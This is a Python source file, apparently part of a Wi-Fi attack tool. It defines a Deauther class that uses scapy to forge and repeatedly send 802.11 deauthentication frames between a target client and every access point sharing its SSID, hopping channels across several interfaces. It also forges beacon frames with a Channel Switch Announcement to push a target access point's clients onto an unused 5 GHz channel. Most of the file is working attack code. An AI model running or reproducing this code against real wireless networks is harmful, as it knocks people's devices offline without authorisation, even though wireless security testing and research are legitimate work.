import threading
import random

from logging_config import setup_logger

from scapy.layers.dot11 import Dot11,RadioTap,Dot11Deauth,Dot11Elt,Dot11Beacon
from scapy.all import sendp
import main.if_config as if_config

logger = setup_logger(__name__)

class Deauther:
    def __init__(self,db_interface,interfaces,target,attack_type):
        self.attack_type = attack_type
        self.db_interface = db_interface
        self.interfaces = interfaces
        self.target = target

        self.stop_event = threading.Event()
        self.threads = []


    def start(self):
        '''
            Start performing the attack and start the attacking threads
        '''
        self.stop_event.clear()

        if self.attack_type == "csa_attack":
            ssid = self.db_interface.get_ap_ssid(self.target)
            ap_channel = self.db_interface.get_ap_channel(self.target)
            five_ghz_channels = [36,40,44,48,52,56,60,64,100,104,108,112,116,120,124,128,132,136,140]
            channels = [ap['channel'] for ap in self.db_interface.get_aps_by_ssid(ssid)]

            new_channel = 100
            for i in range(len(five_ghz_channels)):
                i_channel = five_ghz_channels[i*4%len(five_ghz_channels)]
                if not i_channel in channels:
                    new_channel = i_channel
                    break

            print("SSID:"+str(ssid))
            print("AP channel:"+str(ap_channel))

            csa_beacon_frame = [self._generate_csa_beacon_frame(self.target,ssid,new_channel)]

            th = threading.Thread(target=self._deauth_interface_thread,args=(self.interfaces[0],csa_beacon_frame,[ap_channel]))
            th.daemon = True
            th.name = "CSA Deauther:" + str(self.interfaces[0])
            self.threads.append(th)
            th.start()


        elif self.attack_type == "deauth_attack":
            ssid = self.db_interface.get_client_ssid(self.target)
            aps = self.db_interface.get_aps_by_ssid(ssid)

            # Equaly distribute the channels to hop among the interfaces
            unique_channels = list(set([ap['channel'] for ap in aps]))
            cpi = len(unique_channels)/len(self.interfaces) # Channels per interface
            for i, interface in enumerate(self.interfaces):
                interface_channels = unique_channels[round(i*cpi):round((i+1)*cpi)]
                if interface_channels:
                    frames_to_send = []
                    channels_to_send = []
                    for ap in aps:
                        if ap['channel'] in interface_channels:
                            channels_to_send += [ap['channel']]*2
                            frames_to_send.append(self._generate_deauth_frame(self.target,ap['mac']))
                            frames_to_send.append(self._generate_deauth_frame(ap['mac'],self.target)) 
                    th = threading.Thread(target=self._deauth_interface_thread,args=(interface,frames_to_send,channels_to_send))
                    th.daemon = True
                    th.name = "Deauther:" + str(interface)
                    self.threads.append(th)
                    th.start()

    def _deauth_interface_thread(self,interface,frames,channels):
        logger.debug("%s started on %s Channels:%s",self.attack_type,str(interface),str(channels))
        prev_channel = channels[0]
        if_config.setChannel(interface,prev_channel)
        while not self.stop_event.is_set():
            for i, frame in enumerate(frames):
                if channels[i] != prev_channel:
                    if_config.setChannel(interface,channels[i])
                    prev_channel = channels[i]
                sendp(frame, iface=interface)
                logger.debug("Sending deauth on channel " + str(channels[i]) +" on interface " + interface + " from " + frame.addr1 + " to:" + frame.addr2)

    
    def stop(self):
        ''' Stop the attack, stop the threads and wait for them to stop'''
        self.stop_event.set()
        for thread in self.threads:
            thread.join()
        self.threads = []
        logger.debug("Deauth threads: stopped")

    def _generate_deauth_frame(self,dst,src):
        random_reason_code = random.randrange(1,67)
        return RadioTap()/Dot11(
            addr1=self._format_mac_address(dst), 
            addr2=self._format_mac_address(src), 
            addr3=self._format_mac_address(src))/Dot11Deauth(reason=random_reason_code)
    
    def _generate_csa_beacon_frame(self,mac,ssid,newchannel):
        dot11 = Dot11(
            type=0, 
            subtype=8, 
            addr1="ff:ff:ff:ff:ff:ff", 
            addr2=self._format_mac_address(mac), 
            addr3=self._format_mac_address(mac))
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))
        csa = Dot11Elt(ID=37, info=(
        '\x00'    #Channel switch mode
        + chr(newchannel)     #Channel to switch to
        + '\x00'))  #channel switch count    
        return RadioTap()/dot11/beacon/essid/csa



    def _format_mac_address(self,mac):
        if len(mac) != 12:
                raise ValueError("MAC address must be 12 hexadecimal characters long")
        formatted_mac = ":".join(mac[i:i+2] for i in range(0, 12, 2))
        return formatted_mac
